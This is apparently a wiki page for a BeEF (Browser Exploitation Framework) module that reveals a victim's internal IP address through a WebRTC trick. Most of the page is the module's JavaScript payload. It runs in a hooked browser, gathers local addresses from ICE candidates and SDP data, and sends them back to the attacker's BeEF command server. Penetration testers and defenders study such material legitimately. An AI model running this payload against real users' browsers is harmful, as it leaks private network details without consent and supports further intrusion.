## Summary
* **Objective**: Get the internal IP address using a nice WebRTC hack
* **Date**: Septembre 2013
* **Authors**: xntrick, @natevw
* **Browsers**: Firefox, Chrome (all versions)
* [[Code|https://github.com/beefproject/beef/tree/master/modules/host/get_internal_ip_webrtc]]

## Internal Working

Use a fun RTC Hack to get the IP address:

```javascript
var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

        if (RTCPeerConnection) (function () {

                var addrs = Object.create(null);
            addrs["0.0.0.0"] = false;

            // Establish a connection with ICE / relay servers - in this instance: NONE
            var rtc = new RTCPeerConnection({iceServers:[]});
            if (window.mozRTCPeerConnection) {      // FF needs a channel/stream to proceed
                rtc.createDataChannel('', {reliable:false});
            };

            // Upon an ICE candidate being found
            // Grep the SDP data for IP address data
            rtc.onicecandidate = function (evt) {
                if (evt.candidate) grepSDP(evt.candidate.candidate);
            };

            // Create an SDP offer
            rtc.createOffer(function (offerDesc) {
                grepSDP(offerDesc.sdp);
                rtc.setLocalDescription(offerDesc);
            }, function (e) { beef.net.send('<%= @command_url %>', <%= @command_id %>, "SDP Offer Failed"); });

            function processIPs(newAddr) {
                if (newAddr in addrs) return;
                else addrs[newAddr] = true;
                var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
                beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(" or perhaps "));
            }

            function grepSDP(sdp) {
                var hosts = [];
                sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
                    if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                        var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                            addr = parts[4],
                            type = parts[7];
                        if (type === 'host') processIPs(addr);
                    } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                        var parts = line.split(' '),
                            addr = parts[2];
                        processIPs(addr);
                    }
                });
            }

```

## Feedback

* **Firefox**: Working on 28-

## References

* http://net.ipcalf.com/
